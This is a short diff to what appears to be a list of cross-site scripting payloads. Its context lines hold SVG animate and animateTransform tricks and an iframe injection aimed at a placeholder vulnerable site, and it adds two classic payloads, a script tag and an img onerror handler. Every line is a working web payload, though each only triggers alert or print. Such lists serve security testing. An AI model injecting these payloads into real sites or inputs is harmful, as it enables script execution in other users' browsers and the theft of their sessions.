@@ -2,3 +2,5 @@
 <svg><a><animate attributeName='href' values='javascript:alert(0)' /><text x=25 y=25>click me</text><a/></svg>
 <svg><animateTransform onbegin=alert()></svg>
 <iframe src="https://vulnerableSite.com/?search="><body onresize=print()>" onload=this.style.width='100px'>
+<script>alert(document.domain)</script>
+<img src=1 onerror=alert(1)>
